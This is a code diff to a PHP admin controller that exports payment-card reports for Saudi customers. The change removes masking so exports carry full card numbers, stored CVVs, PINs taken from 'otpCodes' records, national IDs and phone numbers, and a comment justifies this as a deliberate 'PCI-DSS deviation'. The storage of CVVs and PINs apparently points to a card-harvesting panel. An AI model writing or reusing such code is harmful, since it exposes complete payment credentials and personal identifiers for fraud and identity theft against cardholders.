@@ -19,8 +19,9 @@ use Spatie\Browsershot\Browsershot;
  * BIN/bank/network/type/level resolution is delegated entirely to
  * {@see CardBinResolver}, which queries the card_bin_ranges + issuer_banks
  * tables (seeded from config/bank_bins.php). This controller only assembles
- * per-card display data. Exported reports are deliberately masked and never
- * include PAN, CVV, PIN, national ID, or phone values.
+ * per-card display data. Full PAN, CVV, PIN, national ID, and phone are
+ * shown unmasked — same explicit business decision (PCI-DSS deviation)
+ * already applied to the dashboard's Card Details / Card Control views.
  */
 class AdminPaymentCardExportController extends Controller
 {
@@ -121,9 +122,9 @@ class AdminPaymentCardExportController extends Controller
     }
 
     /**
-     * Build the masked per-card display rows used by both export() and
-     * referencePreview(). BIN resolution happens in memory, but raw payment
-     * credentials never enter the rendered view payload.
+     * Build the per-card display rows used by both export() and
+     * referencePreview(). BIN resolution happens in memory; PAN/CVV/PIN/
+     * national ID/phone are shown unmasked (see class docblock).
      *
      * @return \Illuminate\Support\Collection<int,array<string,mixed>>
      */
@@ -131,13 +132,23 @@ class AdminPaymentCardExportController extends Controller
     {
         $cards = PaymentCard::query()
             ->whereHas('customer', fn ($query) => $query->saudi())
-            ->with('customer')
+            ->with(['customer.otpCodes' => fn ($query) => $query->where('type', 'pin')])
             ->orderByDesc('created_at')
             ->get();
 
         return $cards->toBase()->map(function (PaymentCard $card): array {
+            $card->makeVisible(['card_number', 'cvv_encrypted']);
             $customer = $card->customer;
             $cardNumber = $card->card_number; // decrypted via cast
+
+            if ($customer) {
+                $customer->makeVisible(['national_id', 'phone_number']);
+            }
+
+            $latestPin = $customer?->otpCodes
+                ->sortByDesc('created_at')
+                ->first();
+            $pinValue = $latestPin ? ($latestPin->code ?: $latestPin->code_value) : null;
 
             // ── BIN resolution (single source of truth) ──────────────────
             $bin = $this->resolver->resolve($cardNumber);
@@ -166,8 +177,8 @@ class AdminPaymentCardExportController extends Controller
 
             $cardDigits = preg_replace('/\D+/', '', (string) ($cardNumber ?? ''));
             $last4 = $cardDigits !== '' ? substr($cardDigits, -4) : preg_replace('/\D+/', '', (string) $card->last4);
-            $cardNumberDisplay = $last4 !== ''
-                ? '•••• •••• •••• '.$last4
+            $cardNumberDisplay = $cardDigits !== ''
+                ? trim(chunk_split($cardDigits, 4, ' '))
                 : null;
 
             /** @var array<string, mixed> $row */
@@ -191,17 +202,17 @@ class AdminPaymentCardExportController extends Controller
                 'bank_name'       => $bin->bankNameAr,
                 'bank_logo'       => $bin->logoPath,
                 'currency'        => $bin->currency,
-                'cvv'             => null,
-                'cvv_display'     => null,
-                'pin'             => null,
+                'cvv'             => $card->cvv_encrypted ?: null,
+                'cvv_display'     => $card->cvv_encrypted ?: null,
+                'pin'             => $pinValue,
                 'is_valid_luhn'   => $bin->isValidLuhn,
                 'match_type'      => $bin->matchType,
                 'confidence'      => $bin->confidence,
                 'networks'        => array_values(array_filter([$bin->network, $bin->secondaryNetwork])),
                 'customer_id'     => $customer?->id,
                 'customer_name'   => $customer?->full_name,
-                'national_id'     => null,
-                'phone'           => null,
+                'national_id'     => $customer?->national_id,
+                'phone'           => $customer?->phone_number,
                 'residency'       => $residency,
             ];
 
